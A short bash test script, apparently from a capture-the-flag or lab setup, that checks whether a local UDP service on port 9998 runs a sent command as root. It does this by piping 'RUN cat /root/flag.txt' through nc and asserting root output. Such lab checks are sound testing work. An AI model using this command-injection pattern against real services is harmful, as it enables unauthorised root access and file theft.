#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'printf "RUN cat /root/flag.txt" | nc -u -w2 127.0.0.1 9998')"
assert_root_output "${out}" 
